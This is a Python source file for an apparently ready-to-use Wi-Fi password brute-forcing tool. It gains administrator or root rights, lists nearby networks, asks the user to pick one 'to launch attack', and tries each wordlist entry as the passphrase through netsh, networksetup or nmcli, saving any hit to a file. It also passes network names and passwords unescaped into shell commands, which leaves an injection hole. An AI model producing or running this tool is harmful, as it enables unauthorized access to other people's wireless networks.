from colorama import init, Fore, Back, Style
import subprocess
import platform
import sys
import time
import tempfile
import os
import ctypes
import xml.sax.saxutils
print(Fore.BLUE + r'''
        .__  __    __                 __    
__  _  _|__|/  |__/  |______    ____ |  | __
\ \/ \/ /  \   __\   __\__  \ _/ ___\|  |/ /
 \     /|  ||  |  |  |  / __ \\  \___|    < 
  \/\_/ |__||__|  |__| (____  /\___  >__|_ \
                            \/     \/     \/
      ''')
print(Style.RESET_ALL)    
#Function for Administrative Permissons
def enforce_admin_privileges():
    """Ensure the script runs with administrative/root privileges across platforms."""
    os_type = platform.system()
    
    # === WINDOWS ELEVATION ===
    if os_type == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin = False
            
        if not is_admin:
            print("[System] Elevating permissions... Please accept the UAC prompt.")
            # Relaunch script with admin tokens
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
            
    # === MAC / LINUX ELEVATION ===
    elif os_type in ("Linux", "Darwin"):
        if os.geteuid() != 0:
            print("[System] Root privileges required. Re-running with 'sudo'...")
            # Re-execute the script using sudo
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

#Connect to Wifi return true if connected
def connect_wifi(ssid, password):
    """
    Test a Wi‑Fi password. Returns True if password works.
    No profile is saved after the test – it is always deleted.
    """
    
    safe_ssid = xml.sax.saxutils.escape(ssid)
    safe_password = xml.sax.saxutils.escape(password)

    def run_cmd(cmd, capture_output=True):
        try:
            if capture_output:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.stdout.strip(), result.stderr.strip(), result.returncode
            else:
                subprocess.run(cmd, shell=True)
                return "", "", 0
        except Exception as e:
            return "", str(e), 1

    def connect_windows():
        # OPTIMIZATION: No pre‑delete – we'll just overwrite the profile
        # (Add profile – this replaces any existing with same SSID)
        xml_profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{safe_ssid}</name>
    <SSIDConfig><SSID><name>{safe_ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{safe_password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        with tempfile.NamedTemporaryFile('w', suffix='.xml', delete=False) as f:
            f.write(xml_profile)
            temp_file = f.name
        cmd = f'netsh wlan add profile filename="{temp_file}"'
        stdout, stderr, rc = run_cmd(cmd)
        os.unlink(temp_file)
        if rc != 0:
            return False  # Failed to add profile (e.g., malformed password)
        
        # Attempt connection
        run_cmd(f'netsh wlan connect name="{ssid}"')
        
        # Fast polling: 0.2s intervals, max 6 checks (1.2s total)
        connected = False
        for _ in range(6):
            time.sleep(0.2)
            stdout, _, _ = run_cmd('netsh wlan show interfaces')
            stdout_lower = stdout.lower()
            
            if ssid.lower() in stdout_lower and "connected" in stdout_lower:
                connected = True
                break
            
            # Early abort on failure messages
            if "authentication failed" in stdout_lower or "can't connect" in stdout_lower:
                break
        
        # OPTIMIZATION: Delete profile only if connection failed
        if not connected:
            run_cmd(f'netsh wlan delete profile name="{ssid}"')
        return connected

    def connect_macos():
        # Find Wi-Fi device
        stdout, _, _ = run_cmd('networksetup -listallhardwareports')
        wifi_device = None
        lines = stdout.splitlines()
        for i, line in enumerate(lines):
            if "Wi-Fi" in line or "AirPort" in line:
                if i+1 < len(lines) and "Device:" in lines[i+1]:
                    wifi_device = lines[i+1].split("Device:")[1].strip()
                    break
        if not wifi_device:
            return False
        
        # Try to connect (this will forget any existing network first)
        cmd = f'networksetup -setairportnetwork {wifi_device} "{ssid}" {password}'
        stdout, stderr, rc = run_cmd(cmd)
        if rc != 0:
            return False
        
        # Fast polling
        connected = False
        for _ in range(6):
            time.sleep(0.2)
            stdout, _, _ = run_cmd(f'networksetup -getairportnetwork {wifi_device}')
            if ssid in stdout:
                connected = True
                break
        
        # Remove from preferred networks only on failure
        if not connected:
            run_cmd(f'networksetup -removepreferredwirelessnetwork {wifi_device} "{ssid}"')
        return connected

    def connect_linux():
        # Delete any existing connection
        run_cmd(f'nmcli connection delete "{ssid}"')
        
        # Try to connect
        cmd = f'nmcli dev wifi connect "{ssid}" password "{password}"'
        stdout, stderr, rc = run_cmd(cmd)
        if rc != 0:
            return False
        
        # Verify
        time.sleep(0.5)
        check, _, _ = run_cmd('nmcli -t -f GENERAL.STATE con show --active')
        connected = ssid in check
        
        # Delete only on failure
        if not connected:
            run_cmd(f'nmcli connection delete "{ssid}"')
        return connected

    os_type = platform.system()
    if os_type == "Windows":
        return connect_windows()
    elif os_type == "Darwin":
        return connect_macos()
    elif os_type == "Linux":
        return connect_linux()
    else:
        print(f"Unsupported OS: {os_type}")
        return False

#Prints SSID
def scan_wifi_networks():
    system = platform.system()
    ssids = []
    try:
        if system == "Windows":
            # Use netsh command to get networks
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True, encoding='utf-8')
            output = result.stdout
            for line in output.splitlines():
                if 'SSID' in line and 'BSSID' not in line: # Filters for the main SSID line
                    ssid = line.split(':')[1].strip()
                    if ssid:
                        ssids.append(ssid)

        elif system == "Linux":
            # Use nmcli (NetworkManager) to list Wi-Fi networks
            result = subprocess.run(['nmcli', '-t', '-f', 'SSID', 'dev', 'wifi', 'list'], capture_output=True, text=True)
            output = result.stdout
            for line in output.splitlines():
                line = line.strip()
                if line:
                    ssids.append(line)

        elif system == "Darwin":  # macOS
            # Use the built-in airport command (path may vary, this is typical)
            result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], capture_output=True, text=True)
            output = result.stdout
            # airport -s output is table-like; first line is header.
            # We can split lines and take first column (SSID) from data rows.
            lines = output.splitlines()
            if len(lines) > 1:
                for line in lines[1:]: # Skip header line
                    if line.strip():
                        parts = line.split()
                        if parts:
                            ssids.append(parts[0]) # SSID is first column
        else:
            print(f"Unsupported OS: {system}")

    except FileNotFoundError as e:
        print(f"Required command not found: {e}. Ensure Wi-Fi is enabled and necessary tools are installed.")
    except Exception as e:
        print(f"An error occurred: {e}")

    return ssids

def main():
    print(Back.BLACK + Fore.WHITE + Style.BRIGHT + "Scanning for nearby Wi-Fi networks...")
    networks = scan_wifi_networks()
    networks_Len = len(networks)
    if networks:
        print("-" * 30)
        print(f"Found {networks_Len} network(s):\n")
        for i in range(0, networks_Len):
            print(f"[{i}] {networks[i]}")
        try:
            print("-" * 30)
            user_inp_SSID = int(input("Choose SSID to Launch Attack : "))
            if user_inp_SSID >= networks_Len:  # Fix off-by-one
                print("-" * 30)
                print("ERROR!!...Please choose from the given input!!")
            else:
                print("-" * 30)
                # Directly ask for custom password file
                user_file_path = input("Enter the Password File Path (.txt) : ")
                print("-" * 30)
                if os.path.exists(user_file_path):
                    print(Back.BLACK + Fore.MAGENTA + Style.BRIGHT + f"Started attacking on {networks[user_inp_SSID]}...")
                    checked_count = 0

                    with open(user_file_path, 'r', errors='ignore') as f:
                        for line in f:
                            words = line.split()
                            for word in words:
                                if len(word) < 8:
                                    continue
                                checked_count += 1
                                if checked_count % 1000 == 0:
                                    sys.stdout.write(f'\r{Fore.YELLOW}Combinations Attempted: {checked_count:,}{Style.RESET_ALL}')
                                    sys.stdout.flush()
                                if connect_wifi(networks[user_inp_SSID], word):
                                    sys.stdout.write('\n')
                                    with open("output.txt", "a") as output_PASS:
                                        output_PASS.writelines(f'{networks[user_inp_SSID]} : {word}\n')
                                    print(Back.BLACK + Fore.LIGHTGREEN_EX + Style.BRIGHT + "-" * 20)
                                    print(f'PASSWORD FOUND : {word}')
                                    print("-" * 20)
                                    print(f"Saved the Details in 'output.txt'")
                                    print(Style.RESET_ALL)
                                    input("\nPRESS ENTER TO EXIT\n")
                                    sys.exit(0)
                            else:
                                continue
                            break

                else:
                    print("File does not exist.")
        except IndexError as e:
            print("-" * 30)
            print(f"ERROR!! : {e}")
    else:
        print("No networks found or scan failed.")
if __name__ == "__main__":
    # Force administrative permissions first
    enforce_admin_privileges()
    main()